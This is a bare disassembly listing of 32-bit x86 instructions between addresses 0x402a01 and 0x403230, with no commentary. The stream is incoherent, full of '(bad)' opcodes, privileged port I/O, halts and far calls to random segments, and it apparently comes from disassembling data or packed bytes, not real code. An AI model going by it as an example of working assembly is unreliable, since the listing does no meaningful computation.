  402a01:	mov    ecx,0x6f3f640c
  402a06:	add    eax,0x9f8e1456
  402a0b:	cs pop eax
  402a0d:	daa    
  402a0e:	mov    ebx,0xdfa1fc5c
  402a13:	sbb    bl,BYTE PTR [edx]
  402a15:	and    eax,0xe27baa56
  402a1a:	sub    eax,0xf07f9f83
  402a1f:	fcmovne st,st(1)
  402a21:	(bad)  
  402a22:	call   0x129bd637
  402a27:	pop    edx
  402a28:	mov    ch,0xf5
  402a2a:	xchg   bh,ch
  402a2c:	icebp  
  402a2d:	inc    ecx
  402a2e:	sbb    ebp,eax
  402a30:	call   0xb687:0xc592d5b
  402a37:	(bad)  [esp+edx*8+0x1a]
  402a3b:	add    ch,BYTE PTR [esi+0x6f]
  402a3e:	ret    
  402a3f:	xchg   esi,eax
  402a40:	jmp    0x402a1a
  402a42:	mov    dh,0x95
  402a44:	shl    BYTE PTR [eax+0x792b97a3],cl
  402a4a:	pop    ebp
  402a4b:	sbb    cl,bl
  402a4d:	xlat   BYTE PTR ds:[ebx]
  402a4e:	call   0x2e3eed22
  402a53:	ss sub al,0x24
  402a56:	sbb    BYTE PTR [ebx-0x38babf2e],0x4
  402a5d:	inc    DWORD PTR [ebx-0x14]
  402a60:	fcom   DWORD PTR [edi]
  402a62:	sbb    eax,ebx
  402a64:	sbb    BYTE PTR [ebx-0x4fd0d2b7],bh
  402a6a:	in     al,0x60
  402a6c:	pop    ecx
  402a6d:	fstp   QWORD PTR [ecx-0x47]
  402a70:	mov    al,0x5c
  402a72:	inc    eax
  402a73:	ret    
  402a74:	out    dx,al
  402a75:	mov    ds:0xaef67dc7,al
  402a7a:	adc    DWORD PTR [esi+0x41],ecx
  402a7d:	mov    WORD PTR [eax],es
  402a7f:	cmp    dh,BYTE PTR [bx+0x4f17]
  402a84:	sub    eax,0x3e5f3c3c
  402a89:	hlt    
  402a8a:	imul   ebx,DWORD PTR [edx],0x66828d62
  402a90:	cmp    eax,0x2748a75a
  402a95:	pop    DWORD PTR [esi]
  402a97:	mov    bh,0x4
  402a99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a9a:	ror    dh,0x6c
  402a9d:	in     al,dx
  402a9e:	stos   BYTE PTR es:[edi],al
  402a9f:	std    
  402aa0:	jmp    0xace:0x7e793206
  402aa7:	xor    esi,DWORD PTR [edi-0x1e]
  402aaa:	lock arpl WORD PTR [edi+eax*4-0x79eb06dc],bp
  402ab2:	sub    eax,0x5bcd96b4
  402ab7:	(bad)  
  402ab8:	jne    0x402a9d
  402aba:	int3   
  402abb:	dec    ebp
  402abc:	ja     0x402a9e
  402abe:	mov    eax,0x7b2b3119
  402ac3:	mov    BYTE PTR [eax],ch
  402ac5:	mov    ch,cl
  402ac7:	mov    ebx,0x187bd9bc
  402acc:	and    al,0xa7
  402ace:	aas    
  402acf:	sub    dh,bl
  402ad1:	push   ebp
  402ad2:	push   ecx
  402ad3:	mov    cs,WORD PTR [ebx+0x36d4f35]
  402ad9:	js     0x402a6c
  402adb:	sbb    DWORD PTR [edx+0x5a],eax
  402ade:	fsub   DWORD PTR ds:0x8c011710
  402ae4:	lds    edx,FWORD PTR [eax]
  402ae6:	sar    BYTE PTR [edi-0x27],1
  402ae9:	xchg   edx,eax
  402aea:	call   0x81ad:0x5b6a4384
  402af1:	lea    esi,[ebx]
  402af3:	mov    dl,0x8e
  402af5:	hlt    
  402af6:	fild   WORD PTR [esi-0x1e]
  402af9:	ss push eax
  402afb:	fcom   QWORD PTR [edi-0x5f4d85d1]
  402b01:	in     eax,0xd1
  402b03:	sub    dl,dl
  402b05:	jae    0x402a9d
  402b07:	add    BYTE PTR [ebx+0x43e7cfb1],ch
  402b0d:	jge    0x402b66
  402b0f:	imul   esi,DWORD PTR [esi-0x4217c8d0],0x9218df6c
  402b19:	ja     0x402ad1
  402b1b:	or     DWORD PTR [edi+0x1e],0xfffffffe
  402b1f:	jns    0x402ab2
  402b21:	mov    ebp,0x51408d30
  402b26:	cmp    esi,DWORD PTR [esi+0x5c]
  402b29:	cmp    edi,esi
  402b2b:	pop    edx
  402b2c:	test   BYTE PTR [edi+0x6b749acf],ah
  402b32:	push   ecx
  402b33:	adc    DWORD PTR [edi-0x4245604a],edi
  402b39:	inc    esp
  402b3a:	mov    esi,0xac204e16
  402b3f:	push   ds
  402b40:	mov    ds:0xf78460c9,eax
  402b45:	sub    edi,DWORD PTR [edx+0x7e]
  402b48:	push   ss
  402b49:	scas   eax,DWORD PTR es:[edi]
  402b4a:	pop    edi
  402b4b:	mov    ecx,0xc92e70d2
  402b50:	jg     0x402bbb
  402b52:	mov    edi,0xbb629f1e
  402b57:	push   edi
  402b58:	fld    QWORD PTR gs:[eax+0x631d0d47]
  402b5f:	adc    cl,BYTE PTR [edi-0x41]
  402b62:	lds    ecx,FWORD PTR [edi+0x30667835]
  402b68:	repnz icebp 
  402b6a:	lea    ebp,[eax]
  402b6c:	call   0x65a66b54
  402b71:	das    
  402b72:	jle    0x402bce
  402b74:	dec    ecx
  402b75:	pop    ss
  402b76:	sbb    al,0x7
  402b78:	push   cs
  402b79:	(bad)  
  402b7a:	mov    ds:0x5657b1b1,al
  402b7f:	cmp    eax,0xff3ada3
  402b84:	cld    
  402b85:	mov    al,0xcd
  402b87:	mov    dh,0xee
  402b89:	mov    esp,esi
  402b8b:	xchg   esi,eax
  402b8c:	je     0x402bad
  402b8e:	add    eax,0xa50e864b
  402b93:	imul   ecx,DWORD PTR [esi],0x64b7cdf1
  402b99:	outs   dx,BYTE PTR cs:[esi]
  402b9b:	cmp    BYTE PTR [edx+0x3],bl
  402b9e:	gs or  dh,dl
  402ba1:	in     al,0x64
  402ba3:	mov    ah,0x77
  402ba5:	push   eax
  402ba6:	cmp    edi,esp
  402ba8:	sub    eax,0x2fed140f
  402bad:	test   BYTE PTR [ecx+0x9],dh
  402bb0:	adc    DWORD PTR [esi-0x4d3e6dc1],esp
  402bb6:	add    esp,ebp
  402bb8:	clc    
  402bb9:	gs dec esi
  402bbb:	ret    0xa148
  402bbe:	sahf   
  402bbf:	sub    ebp,DWORD PTR ds:0x5c48af1d
  402bc5:	mov    cl,0x94
  402bc7:	sub    eax,0xb22081d4
  402bcc:	dec    esi
  402bcd:	jb     0x402bbe
  402bcf:	jne    0x402bad
  402bd1:	sub    BYTE PTR [ebx-0x48],0x85
  402bd5:	fwait
  402bd6:	cld    
  402bd7:	in     al,0xd1
  402bd9:	pop    ss
  402bda:	jne    0x402bfe
  402bdc:	jp     0x402c41
  402bde:	mov    dl,0xa
  402be0:	(bad)  
  402be1:	pop    esp
  402be2:	leave  
  402be3:	and    eax,0x1155ccfd
  402be8:	div    BYTE PTR [ebp+0x12]
  402beb:	mov    bl,al
  402bed:	popa   
  402bee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bef:	fwait
  402bf0:	popa   
  402bf1:	ja     0x402c37
  402bf3:	inc    esi
  402bf4:	xchg   DWORD PTR ds:0x453c90e,ecx
  402bfa:	adc    eax,0x2931252b
  402bff:	das    
  402c00:	pop    edx
  402c01:	pushf  
  402c02:	daa    
  402c03:	sub    eax,0x4bd59b0
  402c08:	aam    0x28
  402c0a:	xor    eax,0x8966042e
  402c0f:	push   ecx
  402c10:	xor    BYTE PTR [ecx-0x594eaa05],bl
  402c16:	fidiv  DWORD PTR ds:0x561f64c2
  402c1c:	nop
  402c1d:	sub    BYTE PTR [ecx+0x69],ah
  402c20:	fwait
  402c21:	shl    esi,0x64
  402c24:	fild   QWORD PTR [ebx-0x46bebf40]
  402c2a:	seta   cl
  402c2d:	or     DWORD PTR [ebp+0x8ee4742],esp
  402c33:	push   ebx
  402c34:	jmp    0xdfde01be
  402c39:	or     al,0xa7
  402c3b:	leave  
  402c3c:	pop    esi
  402c3d:	out    0xbb,al
  402c3f:	sti    
  402c40:	mov    DWORD PTR [ebx],esi
  402c42:	adc    dl,BYTE PTR [edi-0x44]
  402c45:	sbb    eax,0xcd3b9f70
  402c4a:	loop   0x402c0a
  402c4c:	mov    ch,bl
  402c4e:	and    BYTE PTR [eax-0x3aae5b9c],bh
  402c54:	and    ebx,DWORD PTR [ebp+edx*4+0x7434495b]
  402c5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c5c:	inc    ebp
  402c5d:	je     0x402c1b
  402c5f:	imul   esi,esi,0xd71db1e2
  402c65:	mov    edi,0xe70c13c6
  402c6a:	adc    al,0xf8
  402c6c:	inc    ebx
  402c6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c6e:	mov    al,ds:0x862748
  402c73:	sub    eax,0xab1d3119
  402c78:	les    eax,FWORD PTR [ebp-0x561afca3]
  402c7e:	aas    
  402c7f:	jne    0x402c93
  402c81:	push   ecx
  402c82:	jle    0x402c6e
  402c84:	into   
  402c85:	adc    al,0xd2
  402c87:	pop    ecx
  402c88:	and    DWORD PTR [ebp+0xa],edi
  402c8b:	rcr    ah,0xc9
  402c8e:	jne    0x402cc8
  402c90:	mov    eax,ds:0x6f609e3e
  402c95:	xchg   esp,eax
  402c96:	pop    edi
  402c97:	popf   
  402c98:	hlt    
  402c99:	mov    ch,0xe2
  402c9b:	les    edx,FWORD PTR [esi+ebp*1+0x679d6e30]
  402ca2:	loopne 0x402c75
  402ca4:	mov    eax,0x53b1b0a4
  402ca9:	xor    eax,0x4aea912b
  402cae:	xchg   ebx,eax
  402caf:	xchg   edx,ecx
  402cb1:	jl     0x402d31
  402cb3:	in     eax,0x25
  402cb5:	push   edi
  402cb6:	cli    
  402cb7:	in     al,dx
  402cb8:	adc    ch,BYTE PTR [eax-0x32]
  402cbb:	mov    esp,0x5fde785
  402cc0:	xchg   edx,eax
  402cc1:	rcl    BYTE PTR [ecx+esi*4-0x3c7ff283],1
  402cc8:	in     al,dx
  402cc9:	mov    esp,0x5c18a239
  402cce:	arpl   WORD PTR [edi-0x6b],ax
  402cd1:	or     al,0x1c
  402cd3:	(bad)  
  402cd4:	fild   DWORD PTR [esi-0xc]
  402cd7:	jb     0x402c9f
  402cd9:	sub    cl,dl
  402cdb:	jle    0x402c72
  402cdd:	ss call 0x13ca11e2
  402ce3:	ror    edi,0x6a
  402ce6:	ja     0x402c8d
  402ce8:	and    eax,0x850672e6
  402ced:	jmp    0x402c75
  402cef:	nop
  402cf0:	fwait
  402cf1:	cwde   
  402cf2:	js     0x402cc9
  402cf4:	mov    dh,0xf5
  402cf6:	popa   
  402cf7:	loopne 0x402d59
  402cf9:	mov    bh,0x90
  402cfb:	pop    ss
  402cfc:	je     0x402c98
  402cfe:	std    
  402cff:	dec    edx
  402d00:	cmp    DWORD PTR [esi+edi*2],esi
  402d03:	scas   al,BYTE PTR es:[edi]
  402d04:	ins    DWORD PTR es:[edi],dx
  402d05:	mov    ebp,0x23955025
  402d0a:	stc    
  402d0b:	mov    ds:0x7bffbfd0,al
  402d10:	push   cs
  402d11:	and    BYTE PTR [eax+0x3d],ah
  402d14:	inc    eax
  402d15:	inc    esp
  402d16:	mov    ebp,0x89f8bd86
  402d1b:	adc    eax,0xc84e4f54
  402d20:	xor    BYTE PTR [ebx+0xe8639cb],bh
  402d26:	adc    edi,ecx
  402d28:	mov    al,0x93
  402d2a:	jl     0x402d8b
  402d2c:	dec    edx
  402d2d:	loop   0x402cd5
  402d2f:	add    eax,edi
  402d31:	call   0x1dad:0x6ad3180e
  402d38:	hlt    
  402d39:	cld    
  402d3a:	inc    esp
  402d3b:	mov    edx,0xcb277a61
  402d40:	jl     0x402db6
  402d42:	pop    ebp
  402d43:	ror    BYTE PTR [esi-0x6da6218e],1
  402d49:	push   eax
  402d4a:	fs cmp al,0x29
  402d4d:	jle    0x402d81
  402d4f:	jecxz  0x402d4a
  402d51:	sub    DWORD PTR [ebx],esi
  402d53:	jecxz  0x402d7d
  402d55:	jg     0x402d51
  402d57:	pop    edx
  402d58:	push   0x97604f1b
  402d5d:	or     BYTE PTR fs:[eax+0x1eb9f338],ch
  402d64:	imul   edi,DWORD PTR [eax+0x29d1f5e2],0x623505d2
  402d6e:	push   0x72debaec
  402d73:	popa   
  402d74:	cmp    ch,BYTE PTR [esi+0x48e3eea5]
  402d7a:	cmc    
  402d7b:	xchg   ebx,eax
  402d7c:	lahf   
  402d7d:	das    
  402d7e:	mov    eax,ds:0x10f14d72
  402d83:	and    ebp,0xd3b712f5
  402d89:	add    bl,dl
  402d8b:	xor    BYTE PTR [ebp+0x40954cdd],cl
  402d91:	jae    0x402dcf
  402d93:	(bad)  
  402d94:	ds dec edx
  402d96:	or     ah,BYTE PTR [ebp-0x5f]
  402d99:	pop    es
  402d9a:	lods   eax,DWORD PTR ds:[esi]
  402d9b:	inc    ebp
  402d9c:	adc    ebp,DWORD PTR [edx-0x42]
  402d9f:	ret    0x4d57
  402da2:	fidivr WORD PTR [ebx-0x54]
  402da5:	cmp    esi,DWORD PTR [ecx+0x2e]
  402da8:	pop    edx
  402da9:	cdq    
  402daa:	sbb    BYTE PTR [eax-0x50d26669],ch
  402db0:	fdiv   st(7),st
  402db2:	lock stos BYTE PTR es:[edi],al
  402db4:	ins    DWORD PTR es:[edi],dx
  402db5:	sbb    ecx,DWORD PTR [ebx-0x62bf5eac]
  402dbb:	adc    ebp,edi
  402dbd:	xlat   BYTE PTR ds:[ebx]
  402dbe:	mov    dl,0xca
  402dc0:	fldcw  WORD PTR [esi-0x66]
  402dc3:	neg    DWORD PTR [ebx+0x47]
  402dc6:	cmp    DWORD PTR [ecx-0x48ee5771],ebx
  402dcc:	ss jb  0x402d80
  402dcf:	fisttp WORD PTR [ebp-0xb]
  402dd2:	dec    esi
  402dd3:	call   0x79d6087c
  402dd8:	arpl   WORD PTR [ebx-0x1e],sp
  402ddb:	jmp    0x402dfb
  402ddd:	dec    eax
  402dde:	cmp    DWORD PTR [edi+0x35996068],esp
  402de4:	in     al,dx
  402de5:	xor    ah,ah
  402de7:	pop    ss
  402de8:	in     eax,0xd
  402dea:	xchg   edx,eax
  402deb:	dec    ebx
  402dec:	xchg   esp,eax
  402ded:	inc    eax
  402dee:	sar    edi,0x78
  402df1:	je     0x402dfe
  402df3:	es jecxz 0x402de1
  402df6:	dec    edx
  402df7:	daa    
  402df8:	sbb    ah,cl
  402dfa:	icebp  
  402dfb:	mov    ebp,0x26e1db49
  402e00:	in     eax,dx
  402e01:	adc    eax,0x247e2a3c
  402e06:	div    DWORD PTR [edx-0x70]
  402e09:	dec    ecx
  402e0a:	push   ecx
  402e0b:	adc    al,0x86
  402e0d:	jnp    0x402dd0
  402e0f:	dec    edi
  402e10:	mov    edi,0x4c63cc14
  402e15:	in     eax,0x7f
  402e17:	mov    al,ds:0x2de141f4
  402e1c:	loop   0x402e73
  402e1e:	sub    al,0xcb
  402e20:	fsub   QWORD PTR [ebx+0x5c]
  402e23:	loope  0x402e43
  402e25:	inc    edi
  402e26:	jnp    0x402e37
  402e28:	repnz sbb ebp,DWORD PTR [edi]
  402e2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e2c:	pusha  
  402e2d:	test   al,0x42
  402e2f:	aad    0xf5
  402e31:	loopne 0x402dde
  402e33:	addr16 out dx,eax
  402e35:	jno    0x402de3
  402e37:	mov    ecx,0xf8ec3194
  402e3c:	imul   esp,DWORD PTR [ecx-0x54f80d3a],0x7b
  402e43:	adc    DWORD PTR [esi-0x657702d2],ecx
  402e49:	sub    BYTE PTR [edx+0x1d],0xac
  402e4d:	push   0xd3f93574
  402e52:	sbb    DWORD PTR [eax+0x2a978726],ecx
  402e58:	push   ds
  402e59:	mov    bh,0xa7
  402e5b:	xchg   esp,eax
  402e5c:	push   edx
  402e5d:	push   esi
  402e5e:	lahf   
  402e5f:	repz mov dl,0xf9
  402e62:	loop   0x402ea9
  402e64:	not    BYTE PTR [edx]
  402e66:	leave  
  402e67:	dec    eax
  402e68:	hlt    
  402e69:	loop   0x402ebc
  402e6b:	inc    eax
  402e6c:	push   edi
  402e6d:	clc    
  402e6e:	pop    ss
  402e6f:	loop   0x402ead
  402e71:	pop    esi
  402e72:	jecxz  0x402ee7
  402e74:	mov    ch,BYTE PTR [edi]
  402e76:	xchg   ebx,eax
  402e77:	mov    eax,0x52c9ca5a
  402e7c:	xchg   ebp,eax
  402e7d:	loopne 0x402ea5
  402e7f:	push   esi
  402e80:	jmp    0xcee1343b
  402e85:	in     al,dx
  402e86:	xchg   edx,eax
  402e87:	out    0x29,eax
  402e89:	mov    ecx,0xdd3b35bf
  402e8e:	sbb    ah,BYTE PTR [eax+0x6]
  402e91:	and    dh,0x22
  402e94:	addr16 jbe 0x402ee7
  402e97:	mov    edi,0x11f763d8
  402e9c:	(bad)  
  402e9d:	cmp    al,0x2f
  402e9f:	pop    ss
  402ea0:	je     0x402ec7
  402ea2:	(bad)  
  402ea3:	dec    esp
  402ea4:	mov    ecx,0xf499365e
  402ea9:	in     al,dx
  402eaa:	shr    BYTE PTR [esi],1
  402eac:	xchg   esi,eax
  402ead:	sar    DWORD PTR [ebx+0x5d],0xee
  402eb1:	mov    esi,0x2d1f52de
  402eb6:	xchg   ebp,eax
  402eb7:	jo     0x402e9d
  402eb9:	outs   dx,BYTE PTR ds:[esi]
  402eba:	pop    ecx
  402ebb:	scas   eax,DWORD PTR es:[edi]
  402ebc:	sbb    eax,0x562297ce
  402ec1:	inc    edx
  402ec2:	inc    ebp
  402ec3:	aam    0x13
  402ec5:	mov    ds:0x41014319,eax
  402eca:	sbb    DWORD PTR [esi-0x325d7b4d],eax
  402ed0:	ins    DWORD PTR es:[edi],dx
  402ed1:	fdiv   QWORD PTR [eax-0x23]
  402ed4:	cmp    cl,bh
  402ed6:	bound  edx,QWORD PTR [ecx-0x69]
  402ed9:	mov    WORD PTR [edx+edi*1],cs
  402edc:	mov    ds:0x46dc1529,eax
  402ee1:	imul   ebx,DWORD PTR [ebp+0x56],0x64c25eef
  402ee8:	std    
  402ee9:	push   0xffffff84
  402eeb:	cmp    dh,dl
  402eed:	xor    DWORD PTR [ecx+0x67a997d2],0x83d45d2
  402ef7:	enter  0x79c2,0x41
  402efb:	adc    BYTE PTR [edx-0x563848b5],bh
  402f01:	xor    al,0xf6
  402f03:	ffree  st(7)
  402f05:	fiadd  DWORD PTR [eax-0x28b47fe0]
  402f0b:	xchg   edx,eax
  402f0c:	push   esi
  402f0d:	sbb    ch,BYTE PTR [edx]
  402f0f:	daa    
  402f10:	cli    
  402f11:	mov    dh,0x0
  402f13:	into   
  402f14:	in     eax,dx
  402f15:	jle    0x402ed5
  402f17:	dec    eax
  402f18:	jl     0x402f84
  402f1a:	jo     0x402f5f
  402f1c:	enter  0x911b,0x27
  402f20:	sub    DWORD PTR [edi-0x44add053],edi
  402f26:	(bad)  
  402f28:	(bad)  
  402f29:	mov    ebx,0xd1f99ec2
  402f2e:	mov    ebp,DWORD PTR [edx]
  402f30:	lea    ebx,cs:0x9bed26c5
  402f37:	sub    al,0x9a
  402f39:	dec    edx
  402f3a:	inc    ebp
  402f3b:	jo     0x402eea
  402f3d:	mov    eax,ds:0xa336f57d
  402f42:	scas   eax,DWORD PTR es:[edi]
  402f43:	test   esp,ebp
  402f45:	aam    0xbc
  402f47:	xchg   esi,eax
  402f48:	add    al,dh
  402f4a:	or     BYTE PTR [ebx+esi*8-0x76],0xf5
  402f4f:	cld    
  402f50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f51:	push   0xf5db59a2
  402f56:	xor    BYTE PTR [ebx-0x6bdd583],ch
  402f5c:	ror    BYTE PTR [ecx],cl
  402f5e:	scas   al,BYTE PTR es:[edi]
  402f5f:	mov    ds,WORD PTR [edi]
  402f61:	mov    al,ds:0x533d7959
  402f66:	xor    al,0xcc
  402f68:	mov    dl,0x74
  402f6a:	or     eax,0xe03e2bdb
  402f6f:	int    0xc4
  402f71:	adc    ebp,eax
  402f73:	sub    BYTE PTR [edi-0x53],bl
  402f76:	shl    BYTE PTR [esi+0x25],cl
  402f79:	arpl   bx,si
  402f7b:	mov    edx,0x54b1d11d
  402f80:	ss out 0xc9,eax
  402f83:	pop    ebp
  402f84:	dec    ebp
  402f85:	jae    0x402f40
  402f87:	or     al,0xb5
  402f89:	ja     0x402f1a
  402f8b:	mov    ds:0x4b22fbc9,eax
  402f90:	add    BYTE PTR [edx-0x5cce0122],al
  402f96:	popa   
  402f97:	fucomp st(2)
  402f99:	push   esp
  402f9a:	dec    esi
  402f9b:	sbb    al,0x59
  402f9d:	pop    ecx
  402f9e:	inc    ebx
  402f9f:	adc    esi,esp
  402fa1:	adc    BYTE PTR [edx],bh
  402fa3:	add    esp,edi
  402fa5:	call   0x664:0xd3d4f513
  402fac:	xor    ah,ch
  402fae:	xlat   BYTE PTR ds:[ebx]
  402faf:	mov    ebp,0xf961edd1
  402fb4:	mov    cl,0x8b
  402fb6:	inc    ebp
  402fb7:	mov    dh,BYTE PTR [ecx-0xd]
  402fba:	neg    BYTE PTR [esi-0x37f12a1d]
  402fc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fc1:	and    BYTE PTR fs:[eax+0x4665f0a4],al
  402fc8:	push   ebx
  402fc9:	xchg   BYTE PTR [esi-0x66],ch
  402fcc:	daa    
  402fcd:	sti    
  402fce:	ss mov esp,0x71d6c711
  402fd4:	fabs   
  402fd6:	out    dx,al
  402fd7:	or     DWORD PTR [edi-0x3b1e8a3c],esi
  402fdd:	out    dx,al
  402fde:	retf   0x4d09
  402fe1:	call   0x79be:0xa6656cf3
  402fe8:	xlat   BYTE PTR ds:[ebx]
  402fe9:	xlat   BYTE PTR ds:[ebx]
  402fea:	cli    
  402feb:	pop    edx
  402fec:	add    eax,0x5c3f7633
  402ff1:	and    eax,0x80a53fcd
  402ff6:	test   BYTE PTR [ecx],bh
  402ff8:	les    edi,FWORD PTR [edx+0x5483edd7]
  402ffe:	icebp  
  402fff:	mov    ds:0xa43cdf5,al
  403004:	pushf  
  403005:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403006:	mov    ebp,0xc0da8607
  40300b:	scas   al,BYTE PTR es:[edi]
  40300c:	nop
  40300d:	loope  0x402fea
  40300f:	push   eax
  403010:	or     BYTE PTR [ebx],al
  403012:	sub    al,0x1f
  403014:	into   
  403015:	int    0x71
  403017:	mov    dh,0x7a
  403019:	cmp    DWORD PTR [ebp+0x438ca2e1],esi
  40301f:	jmp    0xc944:0x405fbb4
  403026:	jle    0x402fc2
  403028:	mov    WORD PTR [eax+eax*8-0xcb302b5],es
  40302f:	pop    ecx
  403030:	mov    esp,0x6bacaf5b
  403035:	sbb    al,0x47
  403037:	pop    es
  403038:	push   esi
  403039:	retf   
  40303a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40303b:	cld    
  40303c:	fiadd  WORD PTR ds:0x5101a819
  403042:	xchg   edi,eax
  403043:	shl    DWORD PTR [edi],1
  403045:	inc    eax
  403046:	xor    DWORD PTR [edi],edx
  403048:	lods   eax,DWORD PTR ds:[esi]
  403049:	dec    esi
  40304a:	adc    eax,0xbb25a3a9
  40304f:	push   ebp
  403050:	out    dx,al
  403051:	call   0xf376:0xc7eb8b7e
  403058:	call   0xec1e:0x50e9b57c
  40305f:	push   ecx
  403060:	push   cs
  403061:	mov    esi,0x87d274bd
  403066:	ret    0x389b
  403069:	dec    edx
  40306a:	adc    eax,0x3ed8178c
  40306f:	pop    ebx
  403070:	ins    BYTE PTR es:[edi],dx
  403071:	adc    al,0x40
  403073:	mov    bh,0x72
  403075:	and    DWORD PTR [esi-0xe],edi
  403078:	test   ah,ah
  40307a:	mov    bl,0xfb
  40307c:	adc    DWORD PTR [esi],ebp
  40307e:	push   ss
  40307f:	sti    
  403080:	shrd   DWORD PTR [edi-0x6439ae14],ebx,0x13
  403088:	bound  ebp,QWORD PTR [edx+eiz*1+0x39a7c30e]
  40308f:	mov    eax,0xd88bd2b2
  403094:	dec    ecx
  403095:	cmp    ebp,DWORD PTR [ebx-0x4ecdb1ae]
  40309b:	inc    ecx
  40309c:	lods   al,BYTE PTR ds:[esi]
  40309d:	nop
  40309e:	dec    eax
  40309f:	xor    eax,0x2efad969
  4030a4:	jmp    0x8699226e
  4030a9:	rol    BYTE PTR [eax+0x6617ae95],cl
  4030af:	hlt    
  4030b0:	push   cs
  4030b1:	in     al,0xde
  4030b3:	in     eax,0xb8
  4030b5:	cmp    BYTE PTR [edx-0x64],al
  4030b8:	je     0x40312c
  4030ba:	dec    eax
  4030bb:	test   DWORD PTR [ecx],eax
  4030bd:	call   0xf30f:0x20ef8884
  4030c4:	mov    al,ds:0xee4f727b
  4030c9:	ret    0x7ab7
  4030cc:	xchg   esi,eax
  4030cd:	jnp    0x4030c3
  4030cf:	and    BYTE PTR [eax+0x3a2a14f0],dh
  4030d5:	loope  0x40310e
  4030d7:	cli    
  4030d8:	xor    BYTE PTR [ebx],dl
  4030da:	dec    eax
  4030db:	repz and eax,0x1609b656
  4030e1:	jae    0x403112
  4030e3:	push   es
  4030e4:	or     al,0xf3
  4030e6:	pusha  
  4030e7:	lea    esi,[edi]
  4030e9:	push   ds
  4030ea:	fimul  DWORD PTR [ebx-0x16d0a003]
  4030f0:	cdq    
  4030f1:	jg     0x4030e2
  4030f3:	data16 clc 
  4030f5:	xor    ch,bh
  4030f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030f8:	jmp    0x95d9:0xa4b4f450
  4030ff:	cs in  al,0x6e
  403102:	push   edi
  403103:	xor    al,0xbd
  403105:	lahf   
  403106:	inc    edi
  403107:	out    dx,al
  403108:	pushf  
  403109:	inc    ebp
  40310a:	addr16 jae 0x4030f5
  40310d:	mov    dl,0x94
  40310f:	jnp    0x4030c7
  403111:	nop
  403112:	retf   
  403113:	add    BYTE PTR [eax+esi*4+0x3b13c6af],0x10
  40311b:	sbb    dl,BYTE PTR [eax]
  40311d:	dec    ebp
  40311e:	shl    BYTE PTR [esi-0x4b],1
  403121:	retf   
  403122:	sar    DWORD PTR [eax+0x19],1
  403125:	mov    edx,0x1121afdd
  40312a:	inc    esi
  40312c:	sub    edx,DWORD PTR [edx]
  40312e:	pop    eax
  40312f:	test   eax,0x65b3e57d
  403134:	cmc    
  403135:	call   0x8c61:0x48f90f7f
  40313c:	and    DWORD PTR [edi+ebx*4-0x111ba224],0x59
  403144:	xor    al,0xe3
  403146:	sbb    DWORD PTR [edi],edi
  403148:	xchg   esp,eax
  403149:	xchg   BYTE PTR [eax+esi*1+0x5b],bh
  40314d:	xor    al,0xa7
  40314f:	dec    edi
  403150:	inc    ebp
  403151:	lods   eax,DWORD PTR ds:[esi]
  403152:	sub    al,0x26
  403154:	dec    esp
  403155:	mov    WORD PTR [edx],cs
  403157:	in     al,0x1e
  403159:	int3   
  40315a:	repnz mov ecx,0xcc627ac4
  403160:	mov    ecx,DWORD PTR ds:0xd27ffc97
  403166:	ins    BYTE PTR es:[edi],dx
  403167:	loop   0x4031b5
  403169:	inc    edi
  40316a:	(bad)
  40316d:	push   cs
  40316e:	pop    edx
  40316f:	and    bh,dh
  403171:	aaa    
  403172:	xor    ebx,esp
  403174:	mov    eax,ds:0xac6ac273
  403179:	xchg   edx,ecx
  40317b:	fdivr  DWORD PTR [esi+0x5054f5b3]
  403181:	mov    WORD PTR [eax+0x4c6b72ac],?
  403187:	stos   BYTE PTR es:[edi],al
  403188:	call   0xca9e217c
  40318d:	jae    0xae58c53d
  403193:	retf   
  403194:	fsub   QWORD PTR [ecx]
  403196:	xlat   BYTE PTR ds:[ebx]
  403197:	dec    ebx
  403198:	cmp    edi,eax
  40319a:	dec    edi
  40319b:	rol    BYTE PTR [edx+esi*1],1
  40319e:	sbb    BYTE PTR [edi+0x37a48fcb],0x55
  4031a5:	(bad)  
  4031a6:	setno  BYTE PTR [esi+0x14]
  4031aa:	dec    edi
  4031ab:	jae    0x4031dc
  4031ad:	retf   0xc9c2
  4031b0:	mov    eax,ds:0x25fc5aa3
  4031b5:	inc    edi
  4031b6:	das    
  4031b7:	and    BYTE PTR [edx+eax*1-0x71],0x40
  4031bc:	into   
  4031bd:	adc    ebx,DWORD PTR [eax-0xb]
  4031c0:	ds in  al,0xc6
  4031c3:	mov    esp,0x7bc9133e
  4031c8:	fsub   QWORD PTR [edi-0x1806bf05]
  4031ce:	enter  0x5bd3,0xbf
  4031d2:	cdq    
  4031d3:	popa   
  4031d4:	(bad)  
  4031d6:	xor    DWORD PTR [edx+0x75],eax
  4031d9:	push   esi
  4031da:	or     al,0xc0
  4031dc:	and    al,0xf5
  4031de:	outs   dx,DWORD PTR ds:[esi]
  4031df:	and    BYTE PTR [edi+0x3e],bh
  4031e2:	pop    ebp
  4031e3:	mov    BYTE PTR [edx+0x30330b35],dl
  4031e9:	cld    
  4031ea:	jae    0x40324f
  4031ec:	stc    
  4031ed:	into   
  4031ee:	out    0x47,eax
  4031f0:	add    DWORD PTR [esi-0xfb7ba66],esi
  4031f6:	outs   dx,DWORD PTR ds:[esi]
  4031f7:	jl     0x403186
  4031f9:	add    dl,ch
  4031fb:	inc    ecx
  4031fc:	shl    cl,cl
  4031fe:	retf   
  4031ff:	mov    dh,0x33
  403201:	sbb    ebx,DWORD PTR [ecx-0x6640f456]
  403207:	push   esp
  403208:	popa   
  403209:	arpl   WORD PTR [esi],di
  40320b:	call   0xc898:0xdc83f5d2
  403212:	test   ebx,0xcc2db976
  403218:	mov    WORD PTR ds:0x796158cc,cs
  40321e:	xor    DWORD PTR [edi-0x4ffade4],esi
  403224:	sar    BYTE PTR gs:[edi],cl
  403227:	(bad)  
  403228:	sub    ch,ch
  40322a:	pop    ds
  40322b:	repz fcmovbe st,st(1)
  40322e:	sbb    eax,DWORD PTR [ebx]
  403230:	inc    edi
